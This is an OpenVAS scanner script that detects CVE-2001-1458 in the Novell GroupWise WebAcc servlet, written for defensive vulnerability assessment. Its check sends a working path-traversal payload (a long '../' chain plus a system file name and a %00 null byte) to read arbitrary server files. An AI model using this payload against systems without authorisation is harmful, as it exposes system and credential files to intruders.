###############################################################################
# OpenVAS Vulnerability Test
# $Id: novell_groupwise_webacc_information_disclosure.nasl 5638 2017-03-21 07:59:02Z teissa $
#
# Novell Groupwise WebAcc Information Disclosure
#
# Authors:
# Noam Rathaus <noamr@securiteam.com>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2001 Noam Rathaus <noamr@securiteam.com>
# Copyright (C) 2001 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10789");
  script_version("$Revision: 5638 $");
  script_tag(name:"last_modification", value:"$Date: 2017-03-21 08:59:02 +0100 (Tue, 21 Mar 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2001-1458");
  script_bugtraq_id(3436);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Novell Groupwise WebAcc Information Disclosure");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2001 SecuriTeam");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Disable access to the servlet until the author releases a patch.

  Additional information:
  http://www.securiteam.com/securitynews/6S00N0K2UM.html");

  script_tag(name:"summary", value:"Novell Groupwise WebAcc Servlet is installed. This servlet exposes 
  critical system information, and allows remote attackers to read any file.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

url = "/servlet/webacc";
if( is_cgi_installed_ka( port:port, item:url ) ) {

  files = traversal_files();

  foreach file( keys( files ) ) {

    url = "/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../" + files[file]  + "%00";

    if( http_vuln_check( port:port, url:url, pattern:file  ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
  exit( 99 );
}

exit( 0 );